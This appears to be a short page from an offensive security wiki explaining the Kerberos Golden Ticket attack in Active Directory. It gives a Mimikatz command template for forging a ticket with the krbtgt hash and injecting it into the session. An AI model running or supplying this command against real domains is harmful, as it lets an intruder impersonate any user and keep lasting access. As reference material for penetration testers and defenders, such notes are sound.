---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Golden Ticket

A **Golden Ticket** is an TGT (Ticket Granting Ticket) crafted with the domain's **krbtgt** account hash, which is used to cryptographically sign all TGTs in the AD domain. Therefore, with the Golden Ticket an attacker is able to request any service ticket. \
This technique enables long-term access by effectively bypassing typical authentication mechanisms.

The following example shows forging ticket a Golden Ticket using Mimikatz

{% code overflow="wrap" %}
```
privilege::debug                 
kerberos::golden /user:<username> /domain:<domain_name> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:<rid> /ptt
```
{% endcode %}
